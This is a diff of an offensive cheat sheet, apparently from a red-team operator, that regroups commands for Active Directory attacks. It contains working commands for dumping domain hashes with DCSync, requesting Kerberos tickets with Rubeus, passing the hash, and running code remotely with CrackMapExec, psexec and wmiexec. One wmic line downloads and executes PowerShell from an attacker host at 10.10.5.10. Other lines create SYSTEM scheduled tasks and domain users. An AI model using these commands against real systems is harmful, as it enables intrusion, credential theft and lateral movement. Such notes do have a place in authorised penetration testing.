@@ -38,20 +38,28 @@ Overpass the Hash
   dcsync fqdn (dump entire domain hashes)
   Rubeus.exe asktgt /user:USER /enctype:AES256 /aes256:HASH /domain:FQDN /dc:DC_NAME /ptt
 
-CrackMapExec
-  crackmapexec IP_Address -u username -p='password' (Test if you have access)
-  crackmapexec IP -u username -p='password' (--exec-method smbexec) -X 'powershell cmd'
-    - Default exec-method is wmiexec; smbexec will drop as System and wmiexec as user/admin
-  crackmapexec IP -u username -H hash
+Remote Execute
+  CrackMapExec
+    crackmapexec IP_Address -u username -p='password' (Test if you have access)
+    crackmapexec IP -u username -p='password' (--exec-method smbexec) -X 'powershell cmd'
+      - Default exec-method is wmiexec; smbexec will drop as System and wmiexec as user/admin
+    crackmapexec IP -u username -H hash
+  Impacket 
+    python /usr/share/doc/python-impacket/examples/wmiexec.py username:password@10.10.5.11 'cmd /c ipconfig'
+    python /usr/share/doc/python-impacket/examples/psexec.py username:password@10.10.5.11 'cmd /c ipconfig'
+  LolBin
+    runas /netonly /user:domain\username powershell.exe
+    wmic /node:10.0.0.6 /user:administrator process call create "powershell.exe iex (new-object net.webclient).downloadstring('http://10.10.5.10/update')"
+    schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
   
-Impacket
+File Share
+  WebDav (Host File over port 80)
+    pip install wsgidav cheroot
+    wsgidav --host=0.0.0.0 --port=80 --root=/tmp
   SMB Share
     smbserver.py sharename -smb2support directory path (ie. python smbserver.py -smb2support poop /tmp)
       - copy files: xcopy \\10.10.10.14\poop\filename.exe
-  Remote Execution
-  python /usr/share/doc/python-impacket/examples/wmiexec.py username:password@10.10.5.11 'cmd /c ipconfig'
-  python /usr/share/doc/python-impacket/examples/psexec.py username:password@10.10.5.11 'cmd /c ipconfig'
-
+  
 Net Commands
   shell net user username /domain (query domain user)
   shell net user username password /domain /add (Add User)
@@ -88,11 +96,6 @@ Lateral Movement
   link ip addr of target system (from attack box; verify dual home IP addresses)
   exit original beacon
   verify no powershell is running
-  
-LolBin
-  runas /netonly /user:domain\username powershell.exe
-  wmic /node:10.0.0.6 /user:administrator process call create "powershell.exe iex (new-object net.webclient).downloadstring('http://10.10.5.10/update')"
-  schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
   
 PrivEsc
   Kerberoast (Request SPN and get the TGS for offline cracking)
